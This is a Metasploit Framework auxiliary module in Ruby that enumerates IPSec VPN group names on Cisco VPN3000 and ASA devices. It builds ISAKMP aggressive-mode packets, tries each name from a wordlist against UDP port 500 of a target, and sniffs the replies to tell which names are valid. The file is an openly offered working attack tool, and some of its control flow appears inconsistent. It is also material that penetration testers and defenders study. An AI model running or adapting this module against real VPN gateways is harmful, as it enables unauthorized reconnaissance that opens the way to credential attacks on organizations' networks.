##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'bit-struct'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Capture
  include Msf::Exploit::Remote::Udp

  def initialize
    super(
      'Name'           => 'Cisco IPSec VPN Implementation Group Name Enumeration.',
      'Description'    => %q{
                This module enumerates VPN group names from Cisco VPN3000 and Cisco ASA devices.
    },
    'Author'         => [ 'pello' ],
    'License'        => MSF_LICENSE,
    'References'     => [ [ 'URL', 'http://www.cisco.com/en/US/products/products_security_response09186a0080b5992c.html' ] ]
    )
    register_options(
      [
        OptInt.new('TIMEOUT', [ true, "The number of seconds to wait for new data.",3]),
        OptString.new('WORDLIST', [ true,  "Wordlist containing VPN group names.", '']),
        Opt::RPORT(500),
        OptString.new('INTERFACE', [false, 'The name of the interface','eth0'])
    ], self.class)

    deregister_options('PCAPFILE','SNAPLEN','FILTER')

  end

  class IsakmpHeader < Struct.new(
    :initiatorcookie,
    :respondercookie,
    :nextpayload,
    :version,
    :exchangetype,
    :flags,
    :messageid,
    :length
  )

    def initialize
      self.initiatorcookie = ""
      self.respondercookie = ""
      self.nextpayload = 1
      self.version = 0x10
      self.exchangetype = 0x4
      self.flags = 0
      self.messageid = 0
      self.length = 0
    end

    def pack
      [
        initiatorcookie,
        respondercookie,
        nextpayload,
        version,
        exchangetype,
        flags,
        messageid,
        length
      ].pack("a8a8CCCCNN")
    end

  end

  class IsakmpSaPayload < Struct.new(
    :nextpayload,
    :reserved,
    :payloadlength,
    :domain,
    :situation
  )

    def initialize
      self.nextpayload = 4
      self.reserved = 0
      self.payloadlength = 0xa4
      self.domain = 1
      self.situation = 1
    end

    def pack
      [
        nextpayload,
        reserved,
        payloadlength,
        domain,
        situation
      ].pack("CCnNN")
    end

  end

  class IsakmpProposalPayload < Struct.new(
    :nextpayload,
    :reserved,
    :payloadlength,
    :proposalnumber,
    :protocol,
    :spisize,
    :proposaltransforms
  )
    def initialize
      self.nextpayload = 0
      self.reserved = 0
      self.payloadlength = 0x98
      self.proposalnumber = 1
      self.protocol = 1
      self.spisize = 0
      self.proposaltransforms = 4
    end

    def pack
      [
        nextpayload,
        reserved,
        payloadlength,
        proposalnumber,
        protocol,
        spisize,
        proposaltransforms
      ].pack("CCnCCCC")
    end

  end

  class IsakmpTransformPayload < Struct.new(
    :nextpayload,
    :reserved,
    :payloadlength,
    :number,
    :id,
    :padding,
    :encryption,
    :hash,
    :authentication,
    :groupdescription,
    :lifetype,
    :lifeduration
  )

    def initialize
      self.nextpayload = 3
      self.reserved = 0
      self.payloadlength =  0x24
      self.number = 1
      self.id = 1
      self.padding = 0
      self.encryption = 0x80010005
      self.hash = 0x80020002
      self.authentication = 0x8003fde9
      self.groupdescription = 0x80040002
      self.lifetype = 0x800b0001
      self.lifeduration = "\x00\x0c\x00\x04\x00\x00\x70\x80"
    end

    def pack
      [
        nextpayload,
        reserved,
        payloadlength,
        number,
        id,
        padding,
        encryption,
        hash,
        authentication,
        groupdescription,
        lifetype,
        lifeduration
      ].pack("CCnCCnNNNNNA8")
    end

  end

  class IsakmpKeyExchangePayload < Struct.new(
    :nextpayload,
    :reserved,
    :payloadlength,
    :data
  )

    def initialize
      self.nextpayload = 5
      self.reserved = 0
      self.payloadlength = 0x84
      self.data = Rex::Text.rand_text(128,'0x0')
    end

    def pack
      [
        nextpayload,
        reserved,
        payloadlength,
        data
      ].pack("CCnA128")
    end

  end

  class IsakmpNoncePayload < Struct.new(
    :nextpayload,
    :reserved,
    :payloadlength,
    :data
  )

    def initialize
      self.nextpayload = 5
      self.reserved = 0
      self.payloadlength = 0x18
      self.data = Rex::Text.rand_text(20,'0x0')
    end

    def pack
      [
        nextpayload,
        reserved,
        payloadlength,
        data
      ].pack("CCnA20")
    end

  end

  class IsakmpIdPayload < Struct.new(
    :nextpayload,
    :reserved,
    :payloadlength,
    :type,
    :protocol,
    :port,
    :data
  )

    def initialize
      self.nextpayload = 0
      self.reserved = 0
      self.payloadlength = 0
      self.type = 0xb
      self.protocol = 0x11
      self.port = 500
      self.data
    end

    def pack
      [
        nextpayload,
        reserved,
        payloadlength,
        type,
        protocol,
        port,
        data
      ].pack("CCnCCnA*")
    end

  end

  def generate_isakmp_message
    isakmp_hdr = IsakmpHeader.new
    isakmp_hdr.initiatorcookie = Rex::Text.rand_text(8,'0x0')
    isakmp_sa = IsakmpSaPayload.new
    isakmp_proposal = IsakmpProposalPayload.new
    isakmp_transform1 = IsakmpTransformPayload.new
    isakmp_transform2 = IsakmpTransformPayload.new
    isakmp_transform2.number = 0x2
    isakmp_transform2.hash = 0x80020001
    isakmp_transform3 = IsakmpTransformPayload.new
    isakmp_transform3.number = 0x3
    isakmp_transform3.encryption = 0x80010001
    isakmp_transform3.hash = 0x80020002
    isakmp_transform4 = IsakmpTransformPayload.new
    isakmp_transform4.number = 0x4
    isakmp_transform4.encryption = 0x80010001
    isakmp_transform4.hash = 0x80020001
    isakmp_transform4.nextpayload = 0x0
    isakmp_key_exchange = IsakmpKeyExchangePayload.new
    isakmp_nonce = IsakmpNoncePayload.new
    isakmp_id = IsakmpIdPayload.new
    isakmp_id.payloadlength = @groupname.rstrip.length + 8
    isakmp_id.data = @groupname.rstrip

    isakmp_hdr.length = 356 + isakmp_id.data.length

    payload = ""
    payload << isakmp_hdr.pack
    payload << isakmp_sa.pack
    payload << isakmp_proposal.pack
    payload << isakmp_transform1.pack
    payload << isakmp_transform2.pack
    payload << isakmp_transform3.pack
    payload << isakmp_transform4.pack
    payload << isakmp_key_exchange.pack
    payload << isakmp_nonce.pack
    payload << isakmp_id.pack

    return payload
  end

  def check_dpd(pkt)
    pkt2hex = pkt.unpack("C*").map {|x| x.to_s(16)}.join
    pkt2hex =~ /afcad71368a1f1c96b8696fc77571/i
  end

  def build_ipsec_pkt
    payload = generate_isakmp_message
    connect_udp
    pcap = Pcap::open_live(datastore['INTERFACE'], 1500, false, datastore['TIMEOUT'].to_i)
    pcap.setfilter("src host #{datastore['RHOST']} and udp port 500")
    udp_sock.put(payload)
    disconnect_udp
    begin
      Timeout.timeout(datastore['TIMEOUT'].to_i) do
        pcap.each do |r|
          close_pcap
          if check_dpd(r)
            return true
          else
            return false
          end
        end
      end
    rescue Timeout::Error
      close_pcap
      print_status("No reply received. The following group is discovered: " << @groupname.to_s)
      return false
    end
  end

  def check_reachability
    ipsecport = datastore['RPORT']
    datastore['RPORT'] = 62515
    pkt = "\x00\x00\xa5\x4b\x01\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00"
    print_status("Sending VPN client log UDP request to #{datastore['RHOST']}")
    connect_udp
    datastore['RPORT'] = ipsecport

    pcap = Pcap::open_live(datastore['INTERFACE'], 1500, false, datastore['TIMEOUT'].to_i)
    pcap.setfilter("icmp[icmptype] == icmp-unreach and host #{datastore['RHOST']}")
    udp_sock.put(pkt)
    disconnect_udp
    begin
      Timeout.timeout(datastore['TIMEOUT'].to_i) do
        pcap.each do |r|
          print_error("No response from the Cisco VPN remote peer.")
          close_pcap
          return false
        end
      end
    rescue Timeout::Error
      close_pcap
      print_status("Cisco VPN remote peer is ready.")
    end
  end

  def run
    open_pcap unless self.capture

    groupnames = []
    File.open(datastore['WORDLIST'],"rb").each_line do |line|
      groupnames << line.strip
    end

    if check_reachability
      print_status("Starting...")
      groupnames.each do |groupname|
        @groupname = groupname
        if build_ipsec_pkt
          print_status("The following group is discovered: " << @groupname.to_s)
        end
      end
    end

  end


end
